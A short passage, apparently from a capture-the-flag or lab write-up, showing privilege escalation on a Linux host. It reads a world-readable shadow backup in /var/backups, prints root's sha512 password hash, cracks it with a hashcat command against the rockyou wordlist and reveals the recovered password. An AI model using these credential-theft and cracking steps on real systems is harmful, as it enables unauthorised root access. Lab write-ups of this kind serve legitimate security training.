after looking around, we find something in `/var/backups`

There is a `shadow` file in there we can read

This gives us the root pw hash

```
root:$6$KIP2PX8O$7VF4mj1i.w/.sIOwyeN6LKnmeaFTgAGZtjBjRbvX4pEHvx1XUzXLTBBu0jRLPeZS.69qNrPgHJ0yvc3N82hY31
```

$6$ denotes that it is a sha512

we throw this portion into a txt file and crack it
`$6$KIP2PX8O$7VF4mj1i.w/.sIOwyeN6LKnmeaFTgAGZtjBjRbvX4pEHvx1XUzXLTBBu0jRLPeZS.69qNrPgHJ0yvc3N82hY31`

We can use hashcat to crack this
`hashcat -m 1800 --force crack.txt /usr/share/wordlists/rockyou`

root password: `password#1`